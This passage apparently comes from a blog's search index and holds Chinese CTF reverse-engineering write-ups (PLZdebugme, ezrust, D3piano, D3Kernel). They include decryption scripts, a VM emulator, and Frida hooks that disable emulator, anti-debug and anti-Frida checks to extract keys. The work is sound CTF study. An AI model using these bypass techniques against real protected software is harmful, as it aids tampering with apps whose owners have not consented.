0x27, 0x11, 0x7D, 0x0D, 0x0A, 0x77, 0x73,    0x58, 0x5C, 0x4C, 0x32, 0x4D, 0x1E, 0x24, 0x40, 0x67, 0x4A, 0x4E, 0x1D, 0x07, 0x75, 0x19, 0x23    &#125;;    int len = 44;    for (int i = 0; i &lt; 44; ++i) &#123;         Src[i] = out[i];     &#125;    dec1(key, box0, Src); //rc4解密    dec2(box0);    dec3(box0, Src);    dealboxdec(Src, box, len); //反向位运算和与盒的下标映射    print((unsigned char*)Src);\treturn 0;&#125;\n\nPLZdebugme有虚拟机检测，启动frida调试。先hook虚拟机检测函数，修改返回值绕过。脚本如下。在mainactivity有一个Blowfish加密，然后有一个获得密钥的方法g4tk4y在点击按钮时被调用,于是hook方法获取key。在写完两个hook后我们发现运行脚本是报错的\n问题就在run这个方法里，我们到run中查看，是一个执行杀死进程的方法，判断GetPPid()是否为0；不多说，我们直接hook下来把，返回值改为0；然后在点击一下提交按钮，这样我们就获得了密钥jRLgC&#x2F;Pi。接下来就是分析so里面的check函数，是一个移位加密，直接写出解密脚本获得base64编码的密文，拿着密钥解密去cy解密就行,注意有个偏移量要设为0.\nJava.perform(function()&#123;let App = Java.use(&quot;work.pangbai.tool.App&quot;);App[&quot;GetPPid&quot;].implementation = function () &#123;    console.log(`App.GetPPid is called`);  //  let result = this[&quot;GetPPid&quot;]();    console.log(`App.GetPPid result=`);    return &quot;0&quot;;&#125;;&#125;);Java.perform(function()&#123;let MainActivity = Java.use(&quot;work.pangbai.debugme.MainActivity&quot;);MainActivity[&quot;isEmu&quot;].implementation = function () &#123;    console.log(`MainActivity.isEmu is called`);    return false;&#125;;MainActivity[&quot;g4tk4y&quot;].implementation = function () &#123;    console.log(`MainActivity.g4tk4y is called`);    let result = this[&quot;g4tk4y&quot;]();    console.log(`MainActivity.g4tk4y result=$&#123;result&#125;`);    return result;&#125;;&#125;)\n\n#include &lt;stdio.h&gt;void dec1(unsigned int* input,int v6) &#123;    int v11,index,len;    char v15;    unsigned int v16,v1213,v16q,v16h;    len = 12;    index = len -1;    v11 = 11;        do    &#123;        v15 = 32 - v11;        v1213 = input[index] ^ input[index - 1];        if (v6)        &#123;            v16h = v1213 &gt;&gt; v15;            v16q = v1213 &lt;&lt; index;        &#125;        else        &#123;            v16h = v1213 &lt;&lt; v15;            v16q = v1213 &gt;&gt; index;        &#125;        v16 = v16q | v16h;        input[index] = v16 ^ input[index-1];        index--;        v11--;                    &#125; while (index != 0);&#125;int dec2(unsigned int*input,int v6) &#123;    unsigned int index,v21;    unsigned int v17,v17q,v17h;    char v18;    int len;    len = 12;    v18 = 32 - len;    index = 11;    v21 = input[0] ^ input[index];  //注意v21的数据类型不能是char,会变成负数影响下面的操作    if (v6)    &#123;        v17h = v21 &gt;&gt; v18;        v17q = v21 &lt;&lt; len;    &#125;    else    &#123;        v17h = v21 &lt;&lt; v18;        v17q = v21 &gt;&gt; len;    &#125;    v17 = v17q | v17h;    input[0] = v17 ^ input[index];    return 0;&#125;void print(unsigned char* a) &#123;    for (int x = 0; x &lt; 48; x++) &#123;        printf(&quot;%c&quot;, a[x]);    &#125;&#125;unsigned int cc[12] = &#123;    0x9C5F5508, 0x40561970, 0x58676904, 0xC13E5285, 0x75DC2D4C, 0x06F06EAF, 0x6E7B5DA5, 0xE37EAE2A,    0xF1B9FEFD, 0x06966BAC, 0x4A21BF43, 0x47DBF512&#125;;int main() &#123;    int v6;    v6 = 0;    dec2((unsigned int*)cc,v6);    dec1((unsigned int*)cc,v6);    printf(&quot;\\n&quot;);    print((unsigned char*)cc);    //printf(&quot;%s&quot;, cc);\treturn 0;&#125;\n\nezrustrust语言比较新，用高版本的ida打开会更好（IDA9）。\n\n进来就看到一堆，感觉v6就是密文。\n发现下面这个函数里面有一串字符”loverust“，推测这就是加密的函数，但是进入函数后发现是一堆史。想到我们已经知道密钥的位置，所以我们在密钥处下硬件断点，进行动调来寻找逻辑。\n\n发现断点在这个位置，分析一下，这个位置对密钥进行了读取，主要是和一个数据进行了异或操作。于是我们往前看看交叉引用，我们发现，在一个函数中对这个函数进行了多次的循环调用，那么我们就可以确定这是一个加密函数了。\n\n我们回到密钥操作的地方分析。看逻辑就是一个异或，我们很容易知道a1是密钥，v5是偏移量，a3是我们输入的数据。再往上分析v5的值，v5的值是由v7-a2%v6,的来的v7的值是7恒等，v6是8，a2是每次的下标，且v5的初始值是7，那么一开始异或的就是密钥的最后一位，而a2是递增的，推测这个代码的逻辑就是\na3 ^ key[7-2a%8]\n写出解密脚本就行了。\n\nv6 = [18, 31, 20, 21, 30, 15, 95, 57, 43, 51, 7, 65, 58, 79, 95, 3, 16, 44, 53, 6, 58, 4, 26, 31, 0, 14, 26]key = &quot;loverust&quot;a = 0result = &quot;&quot;for x in v6:    index = 7-a%8    x ^= ord(key[index])    result += chr(x)    a+=1print(result)\n\n\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"D^3CTF2025 Re-wp&复现","url":"/2025/07/10/D3CTF2025/","content":"D3piano按正确的音色弹琴拿到flag。\n逻辑在so里面，加载了D3piano。查看后看字符串可以定位到check函数。\n里面是一个gmp库实现的ras校验，获取公钥即可解密。这里用fridahook获取。\n因为是大数，寄存器里应该是一个结构体，这里我们用frida调用gmpz_get_str把hook的数据转为十六进制。\n有frida检测，在player.so的init_array里面，hook去掉检测。\n//frida version 17.1.0function reada()&#123;    var f = File.readAllText(&quot;/proc/self/task&quot;);    console.log(f)&#125;function findSo(name)&#123;    var lib=null;    console.log(`finding $&#123;name&#125;`);    try &#123;        lib = Process.findModuleByName(name)        if (lib === null) &#123;            setTimeout(findSo,200,name);        &#125;        else &#123;            console.log(`found $&#123;name&#125; at $&#123;lib.base&#125;`);            return lib;        &#125;    &#125; catch &#123; &#125;&#125;function hookI(name) &#123;    var lib = findSo(name);    try &#123;        var destFuncAddr = lib.base.add(0x08922A0);        Interceptor.replace(destFuncAddr, new NativeCallback(function () &#123;            console.log(`replace: $&#123;name&#125; func: $&#123;destFuncAddr&#125;`);            return 0;        &#125;, &#x27;int&#x27;, []))    &#125; catch &#123; &#125;&#125;function hookInitArray(name) &#123;    var linkermodule = Process.getModuleByName(&quot;linker64&quot;);    var call_function_addr = null;    var symbols = linkermodule.enumerateSymbols();    for (var i = 0; i &lt; symbols.length; i++) &#123;        var symbol = symbols[i];        // console.log(symbol.name);        if (symbol.name.indexOf(&quot;__dl__ZN6soinfo17call_constructorsEv&quot;) != -1) &#123;            call_function_addr = symbol.address;            console.log(&quot;call_function_addr:&quot; + call_function_addr);            Interceptor.attach(call_function_addr, &#123;                onEnter: function (args) &#123;                    console.log(&quot;call_constructors&quot;);                    hookI(name);                &#125;            &#125;)            return;        &#125;    &#125;&#125;function hook()&#123;    var addr = null;    try &#123;        var module = Process.getModuleByName(&quot;libc.so&quot;);        addr = module.getExportByName(&quot;dlopen&quot;);    &#125; catch (e) &#123;        console.log(e);    &#125;    console.log(&quot;dlopen:&quot;,addr);    Interceptor.attach(addr,&#123;        onEnter: function(args)&#123;            var loadName = args[0].readCString();            console.log(&quot;dlopen: &quot;,loadName);        &#125;,        onLeave: function (retval) &#123;        console.log(&quot;handle:&quot;, retval);    &#125;&#125;);    var android_dlopen_ext = module.getExportByName(&quot;android_dlopen_ext&quot;);    console.log(&quot;android_dlopen_ext:&quot;,android_dlopen_ext);    Interceptor.attach(android_dlopen_ext, &#123;        onEnter: function (args) &#123;            this.call_hook = false;            var so_name = ptr(args[0]).readCString();            console.log(&quot;android_dlopen_ext:&quot;, so_name);        &#125;,         onLeave: function (retval) &#123;&#125;    &#125;);&#125;function getpq()&#123;    var libapp = findSo(&quot;libD3piano.so&quot;).base;    const fn_addr = 0x29AA0;    console.log(&quot;hook&quot;+libapp);    Interceptor.attach(libapp.add(fn_addr), &#123;        onEnter: function () &#123;            try&#123;            var x1 = this.context.x1;              var x2 = this.context.x2;            var gmpz_get_str = new NativeFunction(libapp.add(0x5CFD0),&quot;pointer&quot;,[&quot;pointer&quot;,&quot;int&quot;,&quot;pointer&quot;]);            var mallocAddrp = Memory.alloc(0x1000);            var mallocAddrq = Memory.alloc(0x1000);            var p = gmpz_get_str(mallocAddrp, 16, x1);            var q = gmpz_get_str(mallocAddrq, 16, x2);            console.log(mallocAddrp.readCString());            console.log(mallocAddrq.readCString());            &#125;catch(e)&#123;                console.log(e);            &#125;        &#125;    &#125;);&#125;hookInitArray(&#x27;libMediaPlayer.so&#x27;); //hook initarray去掉反调试getpq();\n\n拿到pq\nfrom Crypto.Util.number import long_to_bytesimport gmpy2p = 0xcd88775691357147eea5dc584718edab9ca314cdd52a8c1cf847dbbb8371798f15e9bdca2bfaa4595d47eecae21bea38691a26e1c707867b5ea2f6f2f03bf4dq = 0x565c0138487b57e4b76d0924163f67facb17a77f83e354cc3c8432879dab4611c2442cdd73f71c9e6cb4e56a7c45a403148e6d558f986ec6505882ae095c34d3n = p * qe = gmpy2.mpz(65537)enc = 0xc901acacbb426c9c447acda82513965ccc3faf6c9dc58d24ed34b62c7fb1548f9ad06b9355c7d20704cfdfdfc89a3f893801e31719564683fdc7de26d807ed27f898edb3efd51b6e8e2a192d6a0929554342adfed541cd8399da0fbacfeaa5b608b887fd74f4f0e31f9bb5816c54163b8e46d27553798233bef6eaf848c64em = pow(enc, e, n)plaintext = long_to_bytes(m)print(plaintext)#b&#x27;This_is_a_fake_flag&#x27;\n\n解密到fake flag。\n仔细看init_array中的内容可知它内置了一个frida，把加密函数和获取声音的函数全部hook了。我们要去寻找hook的listener来看hook后的操作。\n根据多线程的信号量可以知道执行顺序。\nlistener1 hook获取sound顺序的函数的返回值，让sound的顺序固定。\nlistener2 hook check调用两个虚表函数进行检测，onLeave修改原函数的返回值。\nlistener3 hook 十二进制转str的函数，把结果转为16进制字符串。\ncheck：\nLZW压缩算法。\n密钥加密和魔改chacha20。\n只要先把chacha20解密出来就能看出是压缩算法了。\n#include &quot;include/CTFCPP.h&quot;#include &quot;include/ChaCha.h&quot;#include &quot;include/LZW.h&quot;#include &lt;unordered_map&gt;using namespace std;int main() &#123;    string key = &quot;welCoME_70_D3c7F_2025-r3VERSE!!!&quot;;    string nonce = &quot;CDEFGABdegab&quot;;    vector&lt;uint8_t&gt; nonce1(13);    copy(nonce.begin(), nonce.end(), nonce1.begin());    vector&lt;uint8_t&gt; key1(33);    copy(key.begin(), key.end(), key1.begin());    vector&lt;uint8_t&gt; enc1 = &#123;0x2E, 0xD2, 0xDF, 0x53, 0x41, 0xE6, 0x51, 0xA2, 0xD0, 0x8E, 0x43, 0x59, 0x6F, 0xC4, 0x15, 0xAD,     0x97, 0xC2, 0x98, 0xBD, 0x11, 0x05, 0xFE, 0xFF, 0x96, 0x4C, 0xE8, 0x06, 0x50, 0x0E, 0x1D, 0xCA,     0x0E, 0xB2, 0x18, 0xCA, 0x06, 0x54, 0x2E, 0xFA, 0xCD, 0x19, 0xD2, 0x9E, 0xDB, 0x9E, 0x33, 0xCC,     0x5D, 0xAF, 0xED, 0x69, 0x4A, 0xEF, 0x17, 0xB8, 0xD8, 0x40, 0x14, 0x48, 0xCD, 0x37, 0xFC, 0xD0,     0x14, 0x5C, 0x3C, 0x31, 0xC9, 0x15, 0xE6, 0xCF, 0x77, 0x28&#125;;    Chacha::ChaChaEncrypt32(key1,nonce1,enc1,0x221221);        vector&lt;uint8_t&gt; res = LZW::LZW_decode(enc1);    string s(res.begin(), res.end());    cout &lt;&lt; s &lt;&lt; endl;&#125;\n\nchacha20，注释的地方就是bia原来\n#include &quot;ChaCha.h&quot;namespace Chacha&#123;    static inline void u32t8le(uint32_t v, uint8_t p[4])    &#123;        p[0] = v &amp; 0xff;        p[1] = (v &gt;&gt; 8) &amp; 0xff;        p[2] = (v &gt;&gt; 16) &amp; 0xff;        p[3] = (v &gt;&gt; 24) &amp; 0xff;    &#125;    static inline uint32_t u8t32le(uint8_t p[4])    &#123;        uint32_t value = p[3];        value = (value &lt;&lt; 8) | p[2];        value = (value &lt;&lt; 8) | p[1];        value = (value &lt;&lt; 8) | p[0];        return value;    &#125;    static inline uint32_t rotl32(uint32_t x, int n)    &#123;        // http://blog.regehr.org/archives/1063        return x &lt;&lt; n | (x &gt;&gt; (-n &amp; 31));    &#125;    // https://tools.ietf.org/html/rfc7539#section-2.1    static void chacha20_quarterround(uint32_t *x, int a, int b, int c, int d)    &#123;        x[a] += x[b];        x[d] = rotl32(x[d] ^ x[a], 16);        x[c] += x[d];        x[b] = rotl32(x[b] ^ x[c], 12);        x[a] += x[b];        x[d] = rotl32(x[d] ^ x[a], 8);        x[c] += x[d];        x[b] = rotl32(x[b] ^ x[c], 7);    &#125;    static void chacha20_serialize(uint32_t in[16], uint8_t output[64])    &#123;        int i;        for (i = 0; i &lt; 16; i++)        &#123;            u32t8le(in[i], output + (i &lt;&lt; 2));        &#125;    &#125;    static void chacha20_block(uint32_t in[16], uint8_t out[64], int num_rounds)    &#123; // num_rounds 一般为20        int i;        uint32_t x[16];        memcpy(x, in, sizeof(uint32_t) * 16);        for (i = num_rounds; i &gt; 0; i -= 2)        &#123;            // // odd round            // chacha20_quarterround(x, 0, 4, 8, 12);            // chacha20_quarterround(x, 1, 5, 9, 13);            // chacha20_quarterround(x, 2, 6, 10, 14);            // chacha20_quarterround(x, 3, 7, 11, 15);            // // even round            // chacha20_quarterround(x, 0, 5, 10, 15);            // chacha20_quarterround(x, 1, 6, 11, 12);            // chacha20_quarterround(x, 2, 7, 8, 13);            // chacha20_quarterround(x, 3, 4, 9, 14);            // odd round            chacha20_quarterround(x, 0, 4, 8, 12);            chacha20_quarterround(x, 5, 9, 13, 1);            chacha20_quarterround(x, 10, 14, 2, 6);            chacha20_quarterround(x, 15, 3, 7, 11);            // even round            chacha20_quarterround(x, 0, 1, 2, 3);            chacha20_quarterround(x, 5, 6, 7, 4);            chacha20_quarterround(x, 10, 11, 8, 9);            chacha20_quarterround(x, 15, 12, 13, 14);        &#125;        for (i = 0; i &lt; 16; i++)        &#123;            x[i] += in[i];        &#125;        chacha20_serialize(x, out);    &#125;    // https://tools.ietf.org/html/rfc7539#section-2.3    static void chacha20_init_state(uint32_t s[16], uint8_t key[32], uint32_t counter, uint8_t nonce[12])    &#123;        int i;        // refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c        // convert magic number to string: &quot;expand 32-byte k&quot;        // s[0] = 0x61707865;        // s[1] = 0x3320646e;        // s[2] = 0x79622d32;        // s[3] = 0x6b206574;        // for (i = 0; i &lt; 8; i++)        // &#123;        //     s[4 + i] = u8t32le(key + i * 4);        // &#125;        // s[12] = counter;        // for (i = 0; i &lt; 3; i++)        // &#123;        //     s[13 + i] = u8t32le(nonce + i * 4);        // &#125;        // s[0] = 0x61707865;        // s[1] = 0x3320646e;        // s[2] = 0x79622d32;        // s[3] = 0x6b206574;        // s[4] = *(uint32_t *)&amp;key[0];        // s[5] = *(uint32_t *)&amp;key[4];        // s[6] = *(uint32_t *)&amp;key[8];        // s[7] = *(uint32_t *)&amp;key[12];        // s[8] = *(uint32_t *)&amp;key[16];        // s[9] = *(uint32_t *)&amp;key[20];        // s[10] = *(uint32_t *)&amp;key[24];        // s[11] = *(uint32_t *)&amp;key[28];        // s[12] = (uint32_t)(counter &amp; 0xFFFFFFFF);        // s[13] = (uint32_t)(counter &gt;&gt; 32);        // s[14] = *(uint32_t *)&amp;nonce[0];        // s[15] = *(uint32_t *)&amp;nonce[4];        s[0] = 0x61707865;        s[1] = *(uint32_t *)&amp;key[0];        s[2] = *(uint32_t *)&amp;key[4];        s[3] = *(uint32_t *)&amp;key[8];        s[4] = *(uint32_t *)&amp;key[12];        s[5] = 0x3320646e;        s[6] = *(uint32_t *)&amp;nonce[0];        s[7] = *(uint32_t *)&amp;nonce[4];        s[8] = (uint32_t)(counter &amp; 0xFFFFFFFF);        s[9] = (uint32_t)(0);        s[10] = 0x79622d32;        s[11] = *(uint32_t *)&amp;key[16];        s[12] = *(uint32_t *)&amp;key[20];        s[13] = *(uint32_t *)&amp;key[24];        s[14] = *(uint32_t *)&amp;key[28];        s[15] = 0x6b206574;    &#125;    void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *in, int inlen, int rounds)    &#123;        int i, j;        uint32_t s[16];        uint8_t block[64];        chacha20_init_state(s, key, counter, nonce);        for (i = 0; i &lt; inlen; i += 64)        &#123;            chacha20_block(s, block, 20);            // s[12]++;            s[8]++;            for (j = i; j &lt; i + 64; j++)            &#123;                if (j &gt;= inlen)                &#123;                    break;                &#125;                in[j] ^= block[j - i];            &#125;        &#125;    &#125;    void ChaChaEncrypt16(std::vector&lt;uint8_t&gt; key,std::vector&lt;uint8_t&gt; nonce, std::vector&lt;uint8_t&gt; &amp;in,uint32_t counter, int rounds)    &#123;        std::vector&lt;uint8_t&gt; key32(32);        std::copy(key.begin(), key.end(), key32.begin());        ChaCha20XOR(key32.data(), counter, nonce.data(), in.data(), in.size(), rounds);    &#125;    void ChaChaEncrypt32(std::vector&lt;uint8_t&gt; key,  std::vector&lt;uint8_t&gt; nonce, std::vector&lt;uint8_t&gt; &amp;in,uint32_t counter, int rounds)    &#123;        ChaCha20XOR(key.data(), counter, nonce.data(), in.data(), in.size(), rounds);    &#125;&#125;\n\nLZW就用官方wp里的了。\n#include &quot;LZW.h&quot;namespace LZW&#123;std::vector&lt;uint8_t&gt; LZW_decode(std::vector&lt;uint8_t&gt; &amp;compressed)&#123;    std::unordered_map&lt;int, std::vector&lt;uint8_t&gt;&gt; dictionary;    for (int i = 0; i &lt; 256; ++i)    &#123;        dictionary[i] = &#123;static_cast&lt;uint8_t&gt;(i)&#125;;    &#125;    std::vector&lt;uint8_t&gt; codes;    for (uint8_t byte : compressed)    &#123;        codes.push_back(static_cast&lt;int&gt;(byte));    &#125;    std::vector&lt;uint8_t&gt; result;    uint8_t next_code = 0;    if (codes.empty())        return&#123;&#125;;    uint8_t prev_code = codes[0];    result.insert(result.end(), dictionary[prev_code].begin(),                  dictionary[prev_code].end());    for (size_t i = 1; i &lt; codes.size(); ++i)    &#123;        uint8_t curr_code = codes[i];        std::vector&lt;uint8_t&gt; entry;        if (curr_code == next_code)        &#123;            entry = dictionary[prev_code];            entry.push_back(dictionary[prev_code][0]);        &#125;        else if (dictionary.count(curr_code))        &#123;            entry = dictionary[curr_code];        &#125;        else        &#123;            std::cerr &lt;&lt; &quot;Error: Invalid code &quot; &lt;&lt; curr_code &lt;&lt; std::endl;            return&#123;&#125;;        &#125;        result.insert(result.end(), entry.begin(), entry.end());        std::vector&lt;uint8_t&gt; new_entry = dictionary[prev_code];        new_entry.push_back(entry[0]);        dictionary[next_code++] = new_entry;        prev_code = curr_code;    &#125;    return result;&#125;&#125;//bEbAACEBCGGGBdBECECbdaECCGGBAaAaedBEeDdGAdDaBgededFFBFeEaFGdFEbAFEAFgdgDBDBgeggbAeFagaEedbA\n\n把十二进制转为字符串\nfrom Crypto.Util.number import long_to_bytessound = &quot;CDEFGABdegab&quot;m = &quot;0123456789AB&quot;melody = &quot;bEbAACEBCGGGBdBECECbdaECCGGBAaAaedBEeDdGAdDaBgededFFBFeEaFGdFEbAFEAFgdgDBDBgeggbAeFagaEedbA&quot;table = &#123;&#125;res =&quot;&quot;for i,j in zip(sound, m):    table[i] = jfor i in melody:    res += table[i]res = int(res, 12)print(long_to_bytes(res))#b&#x27;Fly1ng_Pi@n0_Key$_play_4_6e@utiful~melody&#x27;\n\n\n\nD3Kernel用层通过通过动态解析函数地址来隐藏了函数的调用，暂时没发现反调试，动调看一下函数调用\n从上往下依次调用\nkernelbase_GetModuleHandleA(Wkernel32.dll) 加载dll\nkernel32_GetProcAddress() 获取api\nntdll_RtlAddVectoredExceptionHandler() 设置异常处理函数，这里我重名名为except_func1\nkernel32_VirtualAlloc()  动态分配一段内存\nshellcode 触发除0异常\n后执行的shellcode触发异常使得ntdll_RtlAddVectoredExceptionHandler()中的函数被执行。异常处理函数里面有很多东西没有被反编译出来。\n有反调试，在_scrt_common_main_seh下断点，用scyllahide注入自带的dll可以去掉反调试。(后面找到了反调试的位置)\n去除反调试加载驱动之后继续研究程序逻辑，发现跳转到了另一个异常处理函数，在第一个异常处理的函数（except_func1）的右边，重命名为except_func2\n\n同样的except_func2里面执行的函数也是通过kernel32_GetProcAddress() 获取的，动调进去看调用的api\n从上往下是\nkernel32_IsDebuggerPresent()\nkernel32_CheckRemoteDebuggerPresent()\n发现反调试，已经用scyllahide绕过了，不必理会\n继续往下执行，发现正式开始加载驱动了，逻辑来到了except_func2的左侧，\napi调用按顺序依次是\nkernel32_CreateFileW(”\\\\.\\d3ctf”)\n输入name和passwd\nkernel32_DeviceIoControl(IOCT:0X222000)  传入输入的数据\nkernel32_DeviceIoControl(IOCT:0X222004)  校验\n得到IOCT码，开始分析内核\n驱动里面第二个函数就是IOCT处理函数，第一个函数是线程启动的一个反调试函数直接patch掉就行。\n\nIOCT&#x3D;&#x3D;0X222000时复制了用户名和密码的数据到内存中。\n我们的输入被保存到140005200处并且前256字节是name，后256位是passwd。\n\nIOCT&#x3D;&#x3D;0X222004 是校验逻辑\n后面是一个虚拟机，分析后得到opcode。\ncode = &#123;    &quot;ret1&quot;: 0, &quot;add&quot;: 1, &quot;sub&quot;: 2, &quot;mul&quot;: 3, &quot;xor&quot;: 4, &quot;low&quot;: 5, &quot;equl&quot;: 6, &quot;ip&quot;: 7, &quot;top==1&quot;: 8,     &quot;top==0&quot;: 9, &quot;in&quot;: 10, &quot;lea&quot;: 11, &quot;lea1&quot;: 12, &quot;str&quot;: 13, &quot;str1&quot;: 14, &quot;pop&quot;: 15, &quot;call&quot;: 16,     &quot;ret2&quot;: 17,&quot;ret3&quot;: 18,&quot;jmp&quot;: 19, &quot;jnz&quot;: 20, &quot;jz&quot;: 21,&quot;lea2&quot;: 22, &quot;str2&quot;: 23,&quot;smc&quot;: 24&#125;\n\n调用逻辑如下\n\n直接提取最后的opcode查看加密逻辑\n\nunsigned int opc[] = &#123;0x0000000a,0x00000000,0x00000018,0x005801c0,0xffa7fe4e,0x00000000,0x0000000a,0x00000000,0x00000018,0x20160070,0xdfe9ff9e,0x00000001,0x0000000a,0x00000000,0x00000018,0x4805801c,0xb7fa7ff2,0x00000002,0x0000000a,0x00000000,0x00000018,0x12016007,0xedfea007,0x00000003,0x0000000a,0x00000064,0x00000018,0x04805801,0xfb7fa80d,0x00000004,0x0000000c,0x0000000a,0x0000000c,0x00000000,0x00000005,0x00000008,0x0000004c,0x0000000a,0x0000000a,0x0000000c,0x00000000,0x00000001,0x00000016,0x0000000e,0x00000002,0x0000000a,0x0000000b,0x0000000c,0x00000000,0x00000001,0x00000016,0x0000000e,0x00000003,0x0000000c,0x00000002,0x0000000c,0x00000003,0x00000004,0x00000017,0x00000004,0x0000000c,0x00000000,0x0000000a,0x00000001,0x00000001,0x0000000e,0x00000000,0x0000000c,0x00000004,0x0000000a,0x00000001,0x00000001,0x0000000e,0x00000004,0x00000007,0x0000001e,0x00000012,0xffffc588,0x00000000,0x55555555,0x00000150,0x00000150,0x00000000,0x00000000,0x00000006,0x00000000,0x00000000,0x00000000&#125;;\n\n分析一下内存结构\n\nv13和stack2可从cal的分析得来，因为数据的加载和校验不在同一个虚拟机的函数，所以虚拟机是很可能有全局变量的。根据加载数据时的opcode(0E000000000000000Ah)发现他调用的存储是str1，这存储的就是全局变量，那么从全局变量中取出就是lea1。str2和lea2也都是在全局变量操作只不过索引不同。str和lea的存储位置和栈帧有关(在cal处可以看到)推测是函数的私有内存，而且私有内存的地址初始值是-101，只有在call的时候才会加上101，所以只有后面call的函数才有这个私有内存。\n\n\nemm，算一下新cal的函数的内存分布。假设是第一个cal的函数:\nstacklen: sizestackbase: vm1 + 3628 + 404 ; 4032stackend:  vm1 + 8*453 + 101 + (ip+3) ; 大于3717varindex: vm1 + *ip + 4*1008 ; 4032\n\n我们发现函数的私有内存和栈帧的起始地址是相同的，所以新call的函数就只有一块内存，一起作为栈帧和内存使用。\n所以内存布置如下，因为直接用结构体调用，所以数组的大小只要不过小就行了，顺序没有要求。\nstruct newStack&#123;\tint memory[1000]; \tint retaddr;&#125;struct vm&#123;\tint* opcode;\tint size;\tint array[1000];\tint length;\tint stack[1000];\tstruct newStack nS[100];&#125;\n\nimport stringopcodes = &#123;    &quot;ADD&quot;: 1,    &quot;SUB&quot;: 2,    &quot;MUL&quot;: 3,    &quot;XOR&quot;: 4,    &quot;LT&quot;: 5,    &quot;EQ&quot;: 6,    &quot;JMP&quot;: 7,    &quot;JNZ&quot;: 8,    &quot;JZ&quot;: 9,    &quot;JMP_REL&quot;: 19,    &quot;JNZ_REL&quot;: 20,    &quot;JZ_REL&quot;: 21,    &quot;PUSH&quot;: 10,    &quot;POP&quot;: 15,    &quot;LOAD_LOCAL&quot;: 11,    &quot;STORE_LOCAL&quot;: 13,    &quot;LOAD_GLOBAL&quot;: 12,    &quot;STORE_GLOBAL&quot;: 14,    &quot;LOAD_INDIRECT&quot;: 22,    &quot;STORE_INDIRECT&quot;: 23,    &quot;CALL&quot;: 16,    &quot;RET&quot;: 17,    &quot;HALT&quot;: 18,    &quot;SMC&quot;: 24,&#125;class NewStack:    def __init__(self, ret_addr=0):        self.return_ip = ret_addr        self.locals = [0] * 1000class VM:    def __init__(self, nglobals_val=200):         self.code = []        self.code_size = 0        self.globals = [0] * nglobals_val        self.stack = []        self.call_stack = []    def set_code(self, codes, code_size=None):         self.code = codes        if code_size is not None:            self.code_size = code_size        else:            self.code_size = len(self.code)    def vm_exec(self, start_ip, smc):        ip = start_ip        # 打印global中的参数        for i in range(min(37, len(self.globals))):            print(self.globals[i], end=&quot; &quot;)        print()        opcode = self.code[ip]        while opcode != opcodes[&quot;HALT&quot;] and ip &lt; self.code_size:            ip += 1  # 指向操作数或下一条指令            if opcode == opcodes[&quot;ADD&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(a + b)                print(f&quot;&#123;a&#125; + &#123;b&#125; = &#123;a + b&#125;&quot;)            elif opcode == opcodes[&quot;SUB&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(a - b)                print(f&quot; &#123;a&#125; - &#123;b&#125; = &#123;a - b&#125;&quot;)            elif opcode == opcodes[&quot;MUL&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(a * b)                print(f&quot; &#123;a&#125; * &#123;b&#125; = &#123;a * b&#125;&quot;)            elif opcode == opcodes[&quot;XOR&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(a ^ b)                print(f&quot; &#123;a&#125; ^ &#123;b&#125; = &#123;a ^ b&#125;&quot;)            elif opcode == opcodes[&quot;LT&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(1 if a &lt; b else 0)                print(f&quot; &#123;a&#125; &lt; &#123;b&#125; == &#123;a&lt;b&#125;&quot;)            elif opcode == opcodes[&quot;EQ&quot;]:                b = self.stack.pop()                a = self.stack.pop()                self.stack.append(1 if a == b else 0)                print(f&quot; &#123;a&#125; == &#123;b&#125; == &#123;a == b&#125;&quot;)                        elif opcode == opcodes[&quot;JMP&quot;]:                target_ip = self.code[ip]                ip = target_ip            elif opcode == opcodes[&quot;JNZ&quot;]:                addr = self.code[ip]                ip += 1                val = self.stack.pop()                if val == 1:                    ip = addr            elif opcode == opcodes[&quot;JZ&quot;]:                addr = self.code[ip]                ip += 1                val = self.stack.pop()                if val == 0:                    ip = addr                        elif opcode == opcodes[&quot;JMP_REL&quot;]:                offset_val = self.code[ip]                ip = (ip - 1) + offset_val            elif opcode == opcodes[&quot;JNZ_REL&quot;]:                offset_val = self.code[ip]                target_addr = (ip - 1) + offset_val                ip += 1                val = self.stack.pop()                if val == 1:                    ip = target_addr            elif opcode == opcodes[&quot;JZ_REL&quot;]:                offset_val = self.code[ip]                target_addr = (ip - 1) + offset_val                ip += 1                val = self.stack.pop()                if val == 0:                    ip = target_addr                        elif opcode == opcodes[&quot;PUSH&quot;]:                value = self.code[ip]                ip += 1                self.stack.append(value)            elif opcode == opcodes[&quot;LOAD_LOCAL&quot;]:                offset = self.code[ip]                ip += 1                current_context = self.call_stack[-1] # 加载当前上下文，即最里层函数                self.stack.append(current_context.locals[offset])            elif opcode == opcodes[&quot;LOAD_GLOBAL&quot;]:                addr = self.code[ip]                ip += 1                self.stack.append(self.globals[addr])                print(f&quot;LoadGlobal [&#123;addr&#125;] = &#123;self.globals[addr]&#125;&quot;)            elif opcode == opcodes[&quot;LOAD_INDIRECT&quot;]:                addr_from_stack = self.stack[-1]                value_from_globals = self.globals[addr_from_stack]                self.stack[-1] = value_from_globals                print(f&quot;Load Global [&#123;addr_from_stack&#125;] = &#123;value_from_globals&#125;&quot;)            elif opcode == opcodes[&quot;STORE_LOCAL&quot;]:                offset = self.code[ip]                ip += 1                value_to_store = self.stack.pop()                current_context = self.call_stack[-1]                current_context.locals[offset] = value_to_store            elif opcode == opcodes[&quot;STORE_GLOBAL&quot;]:                addr = self.code[ip]                ip += 1                value_to_store = self.stack.pop()                self.globals[addr] = value_to_store                print(f&quot;Store Global: [&#123;addr&#125;] = &#123;value_to_store&#125;&quot;)            elif opcode == opcodes[&quot;STORE_INDIRECT&quot;]:                global_addr_operand = self.code[ip]                ip += 1                effective_address = self.globals[global_addr_operand]                value_to_store = self.stack.pop()                self.globals[effective_address] = value_to_store                print(f&quot;str2 global[globals[&#123;global_addr_operand&#125;] (&#123;effective_address&#125;)] = &#123;value_to_store&#125;&quot;)                        elif opcode == opcodes[&quot;POP&quot;]:                self.stack.pop()                        elif opcode == opcodes[&quot;CALL&quot;]:                func_addr = self.code[ip]                ip += 1                nargs = self.code[ip]                